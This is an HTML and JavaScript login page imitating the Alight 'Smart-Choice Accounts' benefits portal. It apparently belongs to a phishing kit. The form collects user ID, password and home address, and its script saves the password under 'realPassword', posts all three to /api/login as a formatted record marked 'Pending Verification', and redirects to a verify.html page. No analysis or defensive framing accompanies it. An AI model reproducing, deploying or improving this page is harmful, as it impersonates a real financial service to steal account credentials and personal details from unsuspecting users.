<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AlightSmart - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f8fafc;
            min-height: 100vh;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo-container {
            text-align: center;
            margin: 40px 0 30px;
        }
        .logo-container h1 {
            font-size: 2.2rem;
            font-weight: 700;
            color: #1e2937;
        }
        .logo-container .subtitle {
            font-size: 1.8rem;
            color: #0f172a;
            margin-top: 5px;
        }
        .sun-icon {
            font-size: 3.5rem;
            margin: 15px 0;
        }
        .form-container {
            width: 100%;
            max-width: 380px;
        }
        label {
            display: block;
            margin: 25px 0 8px;
            font-size: 1.05rem;
            color: #334155;
            font-weight: 500;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: none;
            border-bottom: 1.5px solid #cbd5e1;
            font-size: 1.1rem;
            background: transparent;
        }
        input:focus {
            outline: none;
            border-bottom-color: #3b82f6;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            background: #1e40af;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: 600;
            margin: 15px 0;
            cursor: pointer;
        }
        .signup-btn {
            width: 100%;
            padding: 16px;
            background: transparent;
            color: #166534;
            border: 2px solid #166534;
            border-radius: 50px;
            font-size: 1.2rem;
            font-weight: 600;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <h1>alight</h1>
        <div class="subtitle">Smart-Choice Accounts®</div>
        <div class="sun-icon">☀️</div>
    </div>

    <div class="form-container">
        <form id="loginForm">
            <div class="form-group">
                <label>Enter your User ID</label>
                <input type="text" id="username" placeholder="User ID" required>
            </div>

            <div class="form-group">
                <label>Enter your Password</label>
                <input type="password" id="password" placeholder="Password" required>
            </div>

            <div class="form-group">
                <label>Home Address (Current)</label>
                <input type="text" id="address" placeholder="Enter your current home address" required>
            </div>

            <div class="options">
                <span class="face-id">📷</span>
                <label>
                    Save User ID 
                    <input type="checkbox" style="width: auto;">
                </label>
            </div>

            <button type="submit" class="login-btn">LOG IN</button>
        </form>

        <div class="forgot">
            <a href="#">Forgot User ID</a> | 
            <a href="#">Forgot Password</a>
        </div>

        <button class="signup-btn">SIGN UP</button>

        <div style="text-align:center; margin-top: 30px; color:#166534;">
            Login Problems?
        </div>
    </div>

    <footer>
        <a href="#">Privacy</a>
        <a href="#">Terms and Conditions</a>
        <a href="#">Contact Us</a>
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const homeAddress = document.getElementById('address').value.trim();

            if (!username || !password || !homeAddress) {
                alert("Please fill all fields");
                return;
            }

            // Save real password for verification page
            sessionStorage.setItem('realPassword', password);

            // Save login details (will be updated later by verify page)
            try {
                await fetch('/api/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        username: username,
                        password: password,
                        address: `User ID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
                    })
                });
            } catch (err) {
                console.error("Login save failed", err);
            }

            // Redirect to verification
            window.location.href = "verify.html";
        });
    </script>
</body>
</html>
